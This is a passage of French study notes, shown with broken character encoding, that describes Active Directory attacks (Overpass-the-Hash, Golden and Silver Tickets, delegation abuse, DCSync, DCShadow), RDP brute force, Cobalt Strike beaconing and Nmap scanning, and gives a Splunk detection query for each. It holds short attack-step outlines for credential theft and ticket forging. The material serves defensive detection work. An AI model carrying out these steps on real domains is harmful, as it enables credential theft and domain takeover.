2. **Demande de TGT avec Rubeus** : L'attaquant utilise **Rubeus** pour crÃ©er une requÃªte brute AS-REQ pour un TGT d'un utilisateur spÃ©cifiÃ©. Cette Ã©tape ne nÃ©cessite pas de privilÃ¨ges Ã©levÃ©s, la rendant plus discrÃ¨te.
3. **Soumission du Ticket** : L'attaquant injecte le TGT demandÃ© dans la session en cours, de maniÃ¨re similaire Ã  l'attaque Pass-the-Ticket, pour effectuer des mouvements latÃ©raux.

---

## OpportunitÃ©s de dÃ©tection de l'attaque **Overpass-the-Hash**

### Logique de dÃ©tection clÃ©

* **DÃ©tection de Mimikatz** : Les artefacts d'attaques Overpass-the-Hash basÃ©es sur Mimikatz ressemblent Ã  ceux des attaques **Pass-the-Hash** et peuvent Ãªtre dÃ©tectÃ©s Ã  l'aide de techniques similaires.
* **DÃ©tection de Rubeus** : Lorsque **Rubeus** envoie une requÃªte AS-REQ directement au contrÃ´leur de domaine via le port TCP/UDP 88, cela gÃ©nÃ¨re l'**Event ID 4768**. Cependant, des processus inhabituels communiquant sur le port 88 vers le contrÃ´leur de domaine, autre que `lsass.exe`, peuvent aider Ã  identifier l'activitÃ© potentielle d'Overpass-the-Hash.

---

## Exemple de requÃªte Splunk : DÃ©tection de **Rubeus** dans l'attaque **Overpass-the-Hash**

**Description** : Cette requÃªte identifie les requÃªtes AS-REQ envoyÃ©es sur le port 88 provenant de processus inhabituels, en recherchant spÃ©cifiquement l'**Event ID 3** avec un port de destination Ã©gal Ã  88, tout en excluant `lsass.exe`.

**Plage horaire** : `earliest=1690443407 latest=1690443544`

```spl
index=main earliest=1690443407 latest=1690443544 source="XmlWinEventLog:Microsoft-Windows-Sysmon/Operational" (EventCode=3 dest_port=88 Image!=*lsass.exe) OR EventCode=1
| eventstats values(process) as process by process_id
| where EventCode=3
| stats count by _time, Computer, dest_ip, dest_port, Image, process
| fields - count
```

---

### Explication des composants clÃ©s de la requÃªte

1. **Filtrage des Ã©vÃ©nements** :

   * **SÃ©lection de la source** : Filtre les Ã©vÃ©nements provenant du journal opÃ©rationnel de Sysmon (`XmlWinEventLog:Microsoft-Windows-Sysmon/Operational`).
   * **EventCode 3** : Capture les connexions rÃ©seau effectuÃ©es par l'hÃ´te, ciblant spÃ©cifiquement le trafic vers `dest_port=88` (Kerberos), en excluant `Image=lsass.exe`, car il s'agit d'un processus lÃ©gitime accÃ©dant aux services Kerberos.
   * **OR EventCode 1** : Capture tous les Ã©vÃ©nements de crÃ©ation de processus pour permettre une corrÃ©lation avec d'autres Ã©vÃ©nements liÃ©s aux processus suspects.

2. **Statistiques des Ã©vÃ©nements** :

   * **EventStats** : Ajoute la liste des processus pour chaque identifiant de processus (`process_id`), stockÃ©e sous `process`.
   * **Where EventCode=3** : Filtre pour les Ã©vÃ©nements de connexion rÃ©seau sur le port 88.

3. **AgrÃ©gation et filtrage** :

   * **Stats count by Fields** : AgrÃ¨ge les Ã©vÃ©nements par `_time`, `Computer`, `dest_ip`, `dest_port`, `Image`, et `process`, tout en calculant le nombre dâ€™occurrences (`count`).
   * **Fields - count** : Supprime le champ `count` du rÃ©sultat final pour plus de clartÃ©.

---

```

## **Detecting Golden Tickets and Silver Tickets**

```jsx
## Golden Ticket

Une attaque **Golden Ticket** consiste Ã  forger un Ticket Granting Ticket (TGT) pour usurper lâ€™identitÃ© dâ€™un administrateur de domaine et accÃ©der librement Ã  lâ€™ensemble du domaine. Cette attaque est difficile Ã  dÃ©tecter, car le ticket gÃ©nÃ©rÃ© est techniquement valide et peut Ãªtre crÃ©Ã© hors ligne par un attaquant.

### Ã‰tapes de lâ€™attaque

1. **Extraction du hash KRBTGT** : Lâ€™attaquant rÃ©cupÃ¨re le hash NTLM du compte KRBTGT, souvent via une attaque DCSync ou en extrayant les fichiers `NTDS.dit` et `LSASS`.
2. **CrÃ©ation du TGT falsifiÃ©** : Ã€ lâ€™aide de ce hash, lâ€™attaquant forge un TGT lui attribuant des privilÃ¨ges dâ€™administrateur du domaine.
3. **Injection du TGT** : Ce ticket est injectÃ© dans une session utilisateur, permettant un accÃ¨s non autorisÃ© aux ressources du domaine.

### OpportunitÃ©s de dÃ©tection

La dÃ©tection repose sur certains indicateurs tels que :

* **ActivitÃ© DCSync suspecte** : surveiller les requÃªtes DCSync non lÃ©gitimes.
* **AccÃ¨s Ã  NTDS.dit ou LSASS** : lâ€™Ã©vÃ©nement Sysmon ID 10 peut alerter sur un accÃ¨s Ã  LSASS pour lâ€™extraction de hash.
* **Alertes Pass-the-Ticket** : lâ€™utilisation dâ€™un Golden Ticket ressemble Ã  des comportements Pass-the-Ticket.

---

## Exemple de requÃªte Splunk : DÃ©tection dâ€™un Golden Ticket

**Description** : Cette recherche identifie lâ€™utilisation potentielle dâ€™un Golden Ticket en dÃ©tectant des tickets Kerberos (4769 ou 4770) qui nâ€™ont pas dâ€™Ã©vÃ©nement initial 4768 (AS-REQ), ce qui peut indiquer quâ€™ils ont Ã©tÃ© forgÃ©s.

**Plage temporelle** : `earliest=1690451977 latest=1690452262`

```spl
index=main earliest=1690451977 latest=1690452262 source="WinEventLog:Security" user!=*$ EventCode IN (4768,4769,4770)
| rex field=user "(?<username>[^@]+)"
| rex field=src_ip "(\:\:ffff\:)?(?<src_ip_4>[0-9\.]+)"
| transaction username, src_ip_4 maxspan=10h keepevicted=true startswith=(EventCode=4768)
| where closed_txn=0
| search NOT user="*$@*"
| table _time, ComputerName, username, src_ip_4, service_name, category
```

---

## Silver Ticket

Une attaque **Silver Ticket** permet de forger des tickets de service (TGS) pour accÃ©der Ã  des services spÃ©cifiques (par exemple, SQL Server) sans authentification complÃ¨te auprÃ¨s du contrÃ´leur de domaine. Elle donne un accÃ¨s plus limitÃ© que le Golden Ticket mais reste redoutable.

### Ã‰tapes de lâ€™attaque

1. **Extraction du hash du compte de service** : Lâ€™attaquant rÃ©cupÃ¨re le hash NTLM dâ€™un compte de service cible.
2. **CrÃ©ation dâ€™un TGS falsifiÃ©** : Il forge un ticket de service avec ce hash.
3. **Injection et accÃ¨s** : Le ticket est injectÃ© dans une session pour accÃ©der au service visÃ©.

### OpportunitÃ©s de dÃ©tection

Les indicateurs clÃ©s incluent :

* **CrÃ©ation de nouveaux comptes utilisateurs** : lâ€™Ã©vÃ©nement ID 4720 peut alerter sur des comptes rÃ©cemment crÃ©Ã©s.
* **Attribution de privilÃ¨ges spÃ©ciaux** : lâ€™Ã©vÃ©nement ID 4672 permet de dÃ©tecter des connexions avec des droits Ã©levÃ©s.

---

## Exemples de requÃªtes Splunk pour dÃ©tecter les Silver Tickets

### RequÃªte 1 : Comparaison entre utilisateurs crÃ©Ã©s et utilisateurs connectÃ©s

**Objectif** : Identifier les comptes utilisateurs rÃ©cemment crÃ©Ã©s qui se connectent sans Ãªtre attendus.

**Extraction des utilisateurs crÃ©Ã©s** :

```spl
index=main latest=1690448444 EventCode=4720
| stats min(_time) as _time, values(EventCode) as EventCode by user
| outputlookup users.csv
```

**Comparaison avec les connexions rÃ©centes** :

**Plage temporelle** : `latest=1690545656`

```spl
index=main latest=1690545656 EventCode=4624
| stats min(_time) as firstTime, values(ComputerName) as ComputerName, values(EventCode) as EventCode by user
| eval last24h = 1690451977
| where firstTime > last24h
| convert ctime(firstTime)
| convert ctime(last24h)
| lookup users.csv user as user OUTPUT EventCode as Events
| where isnull(Events)
```

### RequÃªte 2 : DÃ©tection de privilÃ¨ges spÃ©ciaux sur des connexions rÃ©centes

**Objectif** : Identifier des comptes ayant obtenu des privilÃ¨ges Ã©levÃ©s rÃ©cemment, possiblement via un Silver Ticket.

**Plage temporelle** : `latest=1690545656`

```spl
index=main latest=1690545656 EventCode=4672
| stats min(_time) as firstTime, values(ComputerName) as ComputerName by Account_Name
| eval last24h = 1690451977
| where firstTime > last24h
| table firstTime, ComputerName, Account_Name
| convert ctime(firstTime)
```

---

## RÃ©sumÃ©

Les attaques **Golden Ticket** et **Silver Ticket** tirent parti des failles du protocole Kerberos pour obtenir un accÃ¨s non autorisÃ© Ã  un environnement Active Directory. La dÃ©tection repose sur la corrÃ©lation dâ€™Ã©vÃ©nements liÃ©s aux connexions, Ã  la crÃ©ation de comptes et Ã  lâ€™Ã©lÃ©vation de privilÃ¨ges. Lâ€™utilisation de Splunk pour surveiller ces indicateurs permet aux Ã©quipes de sÃ©curitÃ© de repÃ©rer et de rÃ©agir plus efficacement Ã  ces menaces avancÃ©es.

```

## **Detecting Unconstrained Delegation and Constrained Delegation Attacks**

```jsx
### **DÃ©lÃ©gation non contrainte**

La **dÃ©lÃ©gation non contrainte** permet Ã  un service de s'authentifier auprÃ¨s d'autres ressources au nom de n'importe quel utilisateur, exposant ainsi des donnÃ©es sensibles en cas de compromission. Les attaquants peuvent exploiter cette vulnÃ©rabilitÃ© pour extraire les tickets **TGT** de la mÃ©moire et se dÃ©placer latÃ©ralement dans le rÃ©seau.

#### **Ã‰tapes de l'attaque** :

1. Identifier les systÃ¨mes avec la dÃ©lÃ©gation non contrainte activÃ©e.
2. AccÃ©der Ã  un systÃ¨me vulnÃ©rable.
3. Extraire les **TGT** Ã  lâ€™aide dâ€™outils comme **Mimikatz**.

#### **OpportunitÃ©s de dÃ©tection** :

* **Commandes PowerShell** : La surveillance des journaux PowerShell (Event ID 4104) peut rÃ©vÃ©ler des commandes liÃ©es Ã  la dÃ©couverte de la dÃ©lÃ©gation non contrainte.
* **RequÃªtes LDAP** : Analyser les journaux pour dÃ©tecter des requÃªtes LDAP concernant les paramÃ¨tres de dÃ©lÃ©gation.
* **RÃ©utilisation de TGT** : Les dÃ©tections **Pass-the-Ticket** peuvent signaler lâ€™utilisation des TGT.

#### **Exemple de requÃªte Splunk** :

```spl
index=main earliest=1690544538 latest=1690544540 source="WinEventLog:Microsoft-Windows-PowerShell/Operational" EventCode=4104 Message="*TrustedForDelegation*" OR Message="*userAccountControl:1.2.840.113556.1.4.803:=524288*" 
| table _time, ComputerName, EventCode, Message
```

---

### **DÃ©lÃ©gation contrainte**

La **dÃ©lÃ©gation contrainte** restreint la dÃ©lÃ©gation Ã  des services spÃ©cifiques, permettant Ã  un service d'agir au nom d'un utilisateur uniquement pour des ressources dÃ©finies. Cependant, des attaquants peuvent exploiter cette fonctionnalitÃ© via les extensions **S4U** pour sâ€™impliquer dans des attaques de type **Pass-the-Ticket**.

#### **Ã‰tapes de l'attaque** :

1. Identifier les comptes avec `msDS-AllowedToDelegateTo`.
2. Extraire le **TGT** dâ€™un principal.
3. Utiliser les techniques **S4U2self** et **S4U2proxy** pour imiter des comptes privilÃ©giÃ©s.
4. AccÃ©der aux ressources en tant qu'utilisateur cible.

#### **OpportunitÃ©s de dÃ©tection** :

* **RequÃªtes LDAP et PowerShell** : Surveiller les commandes qui recherchent `msDS-AllowedToDelegateTo`.
* **Trafic Kerberos** : Analyser le trafic inhabituel sur le port 88 (Kerberos).

#### **Exemple de requÃªte Splunk** pour la dÃ©couverte de la dÃ©lÃ©gation contrainte via PowerShell :

```spl
index=main earliest=1690544553 latest=1690562556 source="WinEventLog:Microsoft-Windows-PowerShell/Operational" EventCode=4104 Message="*msDS-AllowedToDelegateTo*" 
| table _time, ComputerName, EventCode, Message
```

#### **Exemple de requÃªte Splunk** pour la dÃ©tection avec les logs Sysmon :

```spl
index=main earliest=1690562367 latest=1690562556 source="XmlWinEventLog:Microsoft-Windows-Sysmon/Operational" 
| eventstats values(process) as process by process_id
| where EventCode=3 AND dest_port=88
| table _time, Computer, dest_ip, dest_port, Image, process
```

---

```

## **Detecting DCSync & DCShadow**

```jsx

---

## DCSync

**DCSync** est une technique permettant Ã  un attaquant dâ€™imiter un contrÃ´leur de domaine pour obtenir les donnÃ©es de rÃ©plication dâ€™Active Directory, notamment les **hashs de mots de passe** (actuels et anciens). Cette attaque peut ensuite servir Ã  :

* Forger des **Golden Tickets** ou **Silver Tickets**
* RÃ©aliser des attaques de type **Pass-the-Hash**

### Ã‰tapes de l'attaque

1. **AccÃ¨s Administratif** : Lâ€™attaquant obtient un accÃ¨s administrateur sur une machine liÃ©e au domaine ou Ã©lÃ¨ve ses privilÃ¨ges.
2. **Demande de RÃ©plication** : Ã€ lâ€™aide dâ€™outils comme **Mimikatz**, lâ€™attaquant utilise lâ€™interface `DRSGetNCChanges` pour demander la rÃ©plication.
3. **Exploitation des Hashs** : Les donnÃ©es extraites sont utilisÃ©es pour forger des tickets Kerberos ou compromettre dâ€™autres comptes.

### OpportunitÃ©s de dÃ©tection

* **Ã‰vÃ©nement Windows ID 4662** : Enregistre les opÃ©rations de type *DS-Replication-Get-Changes*, essentielles pour dÃ©tecter les activitÃ©s DCSync.
* **Configuration de l'audit** : L'audit avancÃ© des accÃ¨s au service d'annuaire doit Ãªtre activÃ© (dÃ©sactivÃ© par dÃ©faut).

---

### RequÃªte Splunk â€“ DÃ©tection de DCSync (Event ID 4662)

**Description** : Cette requÃªte dÃ©tecte les tentatives de rÃ©plication en recherchant la propriÃ©tÃ© **"Replicating Directory Changes"** dans les Ã©vÃ©nements 4662.

**Plage temporelle** : `earliest=1690544278 latest=1690544280`

```spl
index=main earliest=1690544278 latest=1690544280 EventCode=4662 Message="*Replicating Directory Changes*"
| rex field=Message "(?P<property>Replicating Directory Changes.*)"
| table _time, user, object_file_name, Object_Server, property
```

---

## DCShadow

**DCShadow** est une attaque plus avancÃ©e permettant Ã  un attaquant de crÃ©er des modifications non autorisÃ©es dans Active Directory **sans gÃ©nÃ©rer de journaux standard**. Cela implique de **crÃ©er un faux contrÃ´leur de domaine (rogue DC)** qui rÃ©plique des changements malveillants vers les vrais contrÃ´leurs de domaine.

### Ã‰tapes de l'attaque

1. **AccÃ¨s Ã©levÃ©** : Lâ€™attaquant doit possÃ©der des privilÃ¨ges suffisants pour inscrire un contrÃ´leur de domaine.
2. **Enregistrement du DC rogue** : Un faux contrÃ´leur de domaine est inscrit et effectue des modifications AD (par exemple, ajouter un utilisateur au groupe "Domain Admins").
3. **RÃ©plication des modifications** : Ces modifications sont propagÃ©es via le mÃ©canisme de rÃ©plication AD.

### OpportunitÃ©s de dÃ©tection

* **Ã‰vÃ©nement ID 4742** : Enregistre les modifications des objets ordinateurs, y compris les changements de **ServicePrincipalName (SPN)**.
* **CrÃ©ation dâ€™un objet `nTDSDSA`** : Un ajout dâ€™objet `nTDSDSA` dans le schÃ©ma AD est souvent un indicateur dâ€™une activitÃ© DCShadow.

---

### RequÃªte Splunk â€“ DÃ©tection de DCShadow (Event ID 4742)

**Description** : Cette requÃªte dÃ©tecte les modifications suspectes des comptes ordinateurs via des changements sur les **ServicePrincipalNames**, liÃ©s Ã  l'activitÃ© DCShadow.

**Plage temporelle** : `earliest=1690623888 latest=1690623890`

```spl
index=main earliest=1690623888 latest=1690623890 EventCode=4742 
| rex field=Message "(?P<gcspn>XX\/[a-zA-Z0-9\.\-\/]+)" 
| table _time, ComputerName, Security_ID, Account_Name, user, gcspn 
| search gcspn=*
```

---

## RÃ©sumÃ©

Les attaques **DCSync** et **DCShadow** reprÃ©sentent des menaces sÃ©rieuses dans un environnement Active Directory. Leur dÃ©tection repose sur la **surveillance d'Ã©vÃ©nements prÃ©cis** (comme les ID 4662 et 4742) et la **corrÃ©lation de comportements anormaux** sur les objets du domaine.

En mettant en place des politiques dâ€™audit avancÃ©es et en exploitant des requÃªtes Splunk bien ciblÃ©es, les Ã©quipes de sÃ©curitÃ© peuvent significativement **amÃ©liorer leurs capacitÃ©s de dÃ©tection et de rÃ©ponse** face Ã  ces techniques furtives.

---

```

## Creating Custom Splunk Applications

```jsx

---

## 1. CrÃ©ation dâ€™une application personnalisÃ©e dans Splunk

### Ã‰tape 1 : AccÃ©der Ã  Splunk Web

* Ouvrez votre navigateur web et connectez-vous Ã  Splunk Web.

### Ã‰tape 2 : AccÃ©der Ã  la gestion des applications

* Dans le menu **Applications** en haut de la page, cliquez sur **GÃ©rer les applications**.

### Ã‰tape 3 : CrÃ©er une nouvelle application

1. Sur la page des applications, cliquez sur **CrÃ©er une application**.

2. Remplissez les champs suivants :

   * **Nom** : Entrez le nom de lâ€™application, par exemple `DÃ©tection d'attaques Active Directory`.
   * **Nom du dossier** : Indiquez un nom similaire, par exemple `AD_Attack_Detection`. Ce dossier sera crÃ©Ã© sous `$SPLUNK_HOME/etc/apps/`.
   * **Version** : Entrez la version initiale, par exemple `1.0.0`.
   * **Description** : Ajoutez une brÃ¨ve description, par exemple `Application de dÃ©tection des attaques Active Directory`.
   * **ModÃ¨le** : Choisissez `barebones` dans la liste dÃ©roulante.

3. Cliquez sur **Enregistrer**. Lâ€™application apparaÃ®tra alors dans la liste des applications.

---

## 2. Comprendre la structure du rÃ©pertoire

AprÃ¨s la crÃ©ation de lâ€™application, accÃ©dez au dossier `$SPLUNK_HOME/etc/apps/AD_Attack_Detection`. Vous y trouverez plusieurs sous-dossiers ayant chacun un rÃ´le spÃ©cifique :

* `/bin` : Contient les scripts personnalisÃ©s.
* `/default` : Contient les fichiers de configuration par dÃ©faut, les vues, les tableaux de bord et la navigation.
* `/local` : Contient les configurations personnalisÃ©es (modifications locales).
* `/metadata` : Contient les fichiers relatifs aux permissions et mÃ©tadonnÃ©es.

---

## 3. Modifier le fichier de navigation

1. Ouvrez le fichier `$SPLUNK_HOME/etc/apps/AD_Attack_Detection/default/data/ui/nav/default.xml` avec un Ã©diteur de texte.
2. Ce fichier XML dÃ©finit la navigation de lâ€™application. Chaque balise `<view>` reprÃ©sente une vue affichÃ©e dans la barre de navigation. Exemple :

```xml
<nav search_view="search">
  <view name="search" default='true' />
  <view name="analytics_workspace" />
  <view name="datasets" />
  <view name="reports" />
  <view name="alerts" />
  <view name="dashboards" />
</nav>
```

* **search\_view** : SpÃ©cifie la vue par dÃ©faut.
* **default='true'** : DÃ©finit la page dâ€™accueil par dÃ©faut (ici, la recherche).

---

## 4. CrÃ©er un tableau de bord (Dashboard)

1. Dans votre application Splunk, allez dans **Tableaux de bord**.

2. Cliquez sur **CrÃ©er un nouveau tableau de bord** et renseignez :

   * **Nom du tableau de bord** : Par exemple `Tableau de bord AD`.
   * **Description** : (facultatif)
   * **Permissions** : DÃ©finissez-les selon vos besoins.
   * **Type de tableau de bord** : Choisissez `Tableaux de bord classiques`.

3. Configurez votre tableau de bord avec des panneaux (panels), des filtres, et une plage temporelle.

4. Pour faire rÃ©fÃ©rence Ã  un champ dâ€™entrÃ©e, utilisez des **tokens** : `$nom_du_champ$`.

### Emplacement des tableaux de bord

Les fichiers XML de configuration des tableaux de bord se trouvent dans :
`<CheminDeLApp>/local/data/ui/views/nom_du_dashboard.xml`.

### Ajouter un tableau de bord Ã  la navigation

1. Ouvrez Ã  nouveau le fichier `default.xml` :
   `$SPLUNK_HOME/etc/apps/AD_Attack_Detection/default/data/ui/nav/default.xml`.
2. Ajoutez le nom du tableau de bord dans la section `<nav>` pour quâ€™il apparaisse dans la barre de navigation.

---

## 5. RedÃ©marrer Splunk

* RedÃ©marrez Splunk pour que les modifications soient prises en compte et que le tableau de bord apparaisse dans la navigation de lâ€™application.

---

## 6. Regrouper plusieurs tableaux de bord

Pour organiser vos tableaux de bord dans un groupe, utilisez la balise `<collection>` dans le fichier `default.xml` :

```xml
<collection label="Tableaux de bord AD">
  <view name="dashboard1" />
  <view name="dashboard2" />
</collection>
```

---

## 7. Mettre Ã  jour une application existante

Pour mettre Ã  jour votre application Ã  partir dâ€™un fichier prÃ©configurÃ© :

1. **TÃ©lÃ©chargez** le fichier `Detection-of-Active-Directory-Attacks.tar.gz` depuis la section des ressources.
2. AccÃ©dez Ã  **Applications â†’ GÃ©rer les applications**, puis cliquez sur **Installer une application Ã  partir dâ€™un fichier**.
3. SÃ©lectionnez le fichier, cochez **Mettre Ã  jour lâ€™application** pour Ã©craser lâ€™existante, puis cliquez sur **TÃ©lÃ©verser**.

---

```

## **Detecting RDP Brute Force Attacks**

```jsx

---

## **DÃ©tection des attaques RDP par brute force**

Les attaques par brute force RDP impliquent des tentatives rÃ©pÃ©tÃ©es de connexion Ã  une session RDP, en exploitant des mots de passe faibles ou par dÃ©faut pour accÃ©der aux systÃ¨mes. Ce guide dÃ©crit comment dÃ©tecter ces attaques avec Splunk et les journaux Zeek.

### **RequÃªte de dÃ©tection**

Cette requÃªte Splunk analyse les journaux Zeek et identifie les adresses IP avec un grand nombre de tentatives de connexion RDP en peu de temps, ce qui peut indiquer une attaque par brute force.

### **Explication de la requÃªte**

1. **Index et sourcetype** :

   * Filtrage des donnÃ©es RDP brute force avec `index="rdp_bruteforce"` et `sourcetype="bro:rdp:json"`.

2. **Binning du temps** :

   * La commande `bin` regroupe les Ã©vÃ©nements en intervalles de 5 minutes, facilitant la dÃ©tection des pics de tentatives typiques des attaques par brute force.

3. **Comptage et regroupement** :

   * La commande `stats` compte les tentatives de connexion par adresse IP source (`id.orig_h`) et adresse IP de destination (`id.resp_h`) dans chaque pÃ©riode de 5 minutes.

4. **Filtrage par seuil** :

   * Le critÃ¨re `where count > 30` filtre les Ã©vÃ©nements oÃ¹ plus de 30 tentatives de connexion sont observÃ©es dans une fenÃªtre de 5 minutes, ce qui peut indiquer une activitÃ© de brute force.

### **RequÃªte Splunk**

```spl
index="rdp_bruteforce" sourcetype="bro:rdp:json"
| bin _time span=5m
| stats count values(cookie) by _time, id.orig_h, id.resp_h
| where count > 30
```

### **InterprÃ©tation des rÃ©sultats**

* **Ã‰vÃ©nements avec un grand nombre de tentatives** : Si une IP source (`id.orig_h`) a plus de 30 tentatives de connexion vers une IP de destination (`id.resp_h`) dans un intervalle de 5 minutes, cela peut indiquer une tentative de brute force.
* **Cookies de session** : Plusieurs valeurs uniques de `cookie` indiquent des tentatives de connexion sÃ©parÃ©es, soutenant la dÃ©tection de motifs de brute force.

```

## D**etecting Beaconing Malware**

```jsx

---

## Vue dâ€™ensemble

Les malwares utilisant des techniques de *beaconing*, comme **Cobalt Strike** dans sa configuration par dÃ©faut, communiquent avec leur serveur de Command & Control (C2) Ã  des intervalles rÃ©guliers. En surveillant les intervalles entre ces communications dans les journaux rÃ©seau (ici via Zeek), on peut identifier des comportements suspects.

Ce guide prÃ©sente une requÃªte Splunk permettant de dÃ©tecter ces schÃ©mas de communication rÃ©guliÃ¨re dans le trafic HTTP.

---

## Configuration de la requÃªte de dÃ©tection

Cette requÃªte Splunk analyse les intervalles temporels dans le trafic HTTP pour identifier les connexions rÃ©pÃ©titives et rÃ©guliÃ¨res â€” caractÃ©ristiques du *beaconing*.

### Explication de la requÃªte

1. **Filtrage des donnÃ©es pertinentes**

   * `index="cobaltstrike_beacon"` et `sourcetype="bro:http:json"` ciblent les journaux HTTP de Zeek (au format JSON) associÃ©s au malware Cobalt Strike.

2. **Tri chronologique des Ã©vÃ©nements**

   * `sort 0 _time` trie les Ã©vÃ©nements par ordre croissant de temps pour permettre des calculs temporels fiables.

3. **Calcul des diffÃ©rences de temps**

   * `streamstats` calcule la diffÃ©rence de temps (`timedelta`) entre deux Ã©vÃ©nements consÃ©cutifs, regroupÃ©s par IP source, IP destination et port de destination.

4. **Calcul de lâ€™intervalle moyen**

   * `eventstats` calcule lâ€™intervalle moyen (`avg`) entre les Ã©vÃ©nements ainsi que leur nombre total (`total`), pour chaque couple source-destination.

5. **DÃ©finition dâ€™une plage dâ€™intervalles acceptables**

   * `eval upper=avg*1.1` et `eval lower=avg*0.9` fixent une marge de Â±10% autour de lâ€™intervalle moyen pour tenir compte des petites variations.

6. **Filtrage des intervalles rÃ©guliers**

   * `where timedelta > lower AND timedelta < upper` conserve les Ã©vÃ©nements dont lâ€™intervalle est proche de la moyenne.

7. **Calcul du pourcentage de rÃ©gularitÃ©**

   * `stats` agrÃ¨ge les donnÃ©es et calcule le pourcentage (`prcnt`) dâ€™Ã©vÃ©nements respectant la plage rÃ©guliÃ¨re pour chaque connexion.

8. **Filtrage sur le seuil de rÃ©gularitÃ©**

   * `where prcnt > 90 AND total > 10` garde uniquement les connexions avec plus de 90% de rÃ©gularitÃ© et au moins 10 Ã©vÃ©nements â€” critÃ¨res minimaux pour Ã©viter les faux positifs.

---

### RequÃªte Splunk

```spl
index="cobaltstrike_beacon" sourcetype="bro:http:json" 
| sort 0 _time
| streamstats current=f last(_time) as prevtime by src, dest, dest_port
| eval timedelta = _time - prevtime
| eventstats avg(timedelta) as avg, count as total by src, dest, dest_port
| eval upper=avg*1.1
| eval lower=avg*0.9
| where timedelta > lower AND timedelta < upper
| stats count, values(avg) as TimeInterval by src, dest, dest_port, total
| eval prcnt = (count/total)*100
| where prcnt > 90 AND total > 10
```

---

## Description des champs

* **`index="cobaltstrike_beacon"`** : Filtre les Ã©vÃ©nements provenant du bon index.
* **`sourcetype="bro:http:json"`** : SpÃ©cifie les journaux HTTP de Zeek au format JSON.
* **`sort 0 _time`** : Trie les Ã©vÃ©nements par ordre chronologique.
* **`streamstats last(_time)`** : Calcule le temps entre chaque Ã©vÃ©nement pour un mÃªme flux (mÃªme src/dest/port).
* **`eventstats avg(timedelta)`** : Calcule lâ€™intervalle moyen et le nombre total dâ€™Ã©vÃ©nements pour chaque connexion.
* **`eval upper / lower`** : DÃ©termine une marge autour de lâ€™intervalle moyen.
* **`where timedelta > lower AND timedelta < upper`** : Ne garde que les intervalles rÃ©guliers.
* **`stats`** : AgrÃ¨ge les rÃ©sultats et calcule le pourcentage de rÃ©gularitÃ©.
* **`where prcnt > 90 AND total > 10`** : Affiche uniquement les connexions prÃ©sentant un comportement typique de beaconing.

---

## InterprÃ©tation des rÃ©sultats

* **Intervalle rÃ©gulier** : Si plus de 90% des communications d'une connexion se font Ã  intervalles constants, cela indique possiblement un comportement de type *beaconing*.
* **Seuil dâ€™Ã©vÃ©nements** : Un minimum de 10 Ã©vÃ©nements est requis pour Ã©viter les fausses alertes dues Ã  un faible volume de donnÃ©es.

---

```

## **Detecting Nmap Port Scanning**

```jsx

---

## ğŸ” **H. DÃ©tection des scans de ports Nmap via Splunk**

Le **scan de ports** est une technique classique de reconnaissance utilisÃ©e par les attaquants pour identifier les services ouverts sur une cible. Lâ€™un des outils les plus couramment utilisÃ©s pour cela est **Nmap**.

Ce type de comportement se manifeste par des **tentatives de connexion Ã  plusieurs ports**, souvent sans envoi de donnÃ©es (payload), dans un laps de temps trÃ¨s court. GrÃ¢ce aux logs Zeek (anciennement Bro), on peut dÃ©tecter ces tentatives suspectes en observant des connexions avec `orig_bytes=0` (aucune donnÃ©e transmise) et en comptant le nombre de ports diffÃ©rents touchÃ©s.

---

### âœ… **RequÃªte Splunk â€“ DÃ©tection dâ€™un scan de ports**

```spl
index="cobaltstrike_beacon" sourcetype="bro:conn:json" orig_bytes=0 dest_ip IN (192.168.0.0/16, 172.16.0.0/12, 10.0.0.0/8) 
| bin span=5m _time 
| stats dc(dest_port) as num_dest_port by _time, src_ip, dest_ip 
| where num_dest_port >= 3
```

---

### ğŸ§  **Explication de la requÃªte**

1. **Source des donnÃ©es**

   * `index="cobaltstrike_beacon"` : Index contenant les logs rÃ©seau capturÃ©s par Zeek.
   * `sourcetype="bro:conn:json"` : Logs JSON relatifs aux connexions rÃ©seau.

2. **Filtrage des connexions sans payload**

   * `orig_bytes=0` : Ne conserve que les connexions oÃ¹ aucun octet nâ€™a Ã©tÃ© transmis par lâ€™Ã©metteur. Cela indique souvent une tentative de **scan ou de reconnaissance passive**, typique dâ€™outils comme Nmap.

3. **Restriction aux plages IP internes**

   * `dest_ip IN (192.168.0.0/16, 172.16.0.0/12, 10.0.0.0/8)` : On ne surveille que les connexions visant des **adresses IP privÃ©es**, afin de dÃ©tecter des comportements suspects au sein du rÃ©seau interne.

4. **AgrÃ©gation temporelle**

   * `| bin span=5m _time` : Regroupe les Ã©vÃ©nements par tranche de 5 minutes, ce qui permet dâ€™identifier des activitÃ©s regroupÃ©es dans le temps â€” comportement typique dâ€™un scan.

5. **Comptage des ports ciblÃ©s**

   * `| stats dc(dest_port) as num_dest_port by _time, src_ip, dest_ip` :

     * Compte le **nombre de ports distincts** touchÃ©s (`dc(dest_port)`) par une IP source (`src_ip`) sur une IP de destination (`dest_ip`) pendant une pÃ©riode de 5 minutes.

6. **Seuil dâ€™alerte**

   * `| where num_dest_port >= 3` : Ne conserve que les cas oÃ¹ **au moins trois ports diffÃ©rents** ont Ã©tÃ© ciblÃ©s en 5 minutes. Cela correspond Ã  un **comportement suspect**, pouvant indiquer un scan en phase de reconnaissance.

---

### ğŸ•µï¸ **InterprÃ©tation des rÃ©sultats**

* **IP source suspecte (`src_ip`)** : Lâ€™adresse identifiÃ©e comme ayant tentÃ© de scanner plusieurs ports sans transmettre de donnÃ©es.
* **Scan de reconnaissance** : Les scans Ã  faible bruit (ex : 3 ports seulement) sont souvent utilisÃ©s pour Ã©viter la dÃ©tection. Un seuil plus Ã©levÃ© (5 ou 10 ports) peut Ãªtre utilisÃ© pour dÃ©tecter des scans plus agressifs.
* **Contexte interne** : Un scan de ports interne peut indiquer quâ€™un poste compromis tente de cartographier le rÃ©seau.

---

### âš™ï¸ **Recommandations**

* **Augmenter le seuil si trop de faux positifs**
  Un `num_dest_port` > 3 peut Ãªtre trop faible selon lâ€™environnement ; augmenter Ã  5 ou 10 selon le contexte rÃ©seau.
* **CorrÃ©lation avec dâ€™autres Ã©vÃ©nements**
  Associer cette dÃ©tection Ã  des tentatives dâ€™exploitation, de connexion SSH, ou Ã  des alertes IDS/IPS pour enrichir lâ€™analyse.

---

```

## **Detecting Kerberos Brute Force Attacks.**

```jsx

---

## ğŸ” **G. DÃ©tection des attaques Brute Force Kerberos via Splunk**

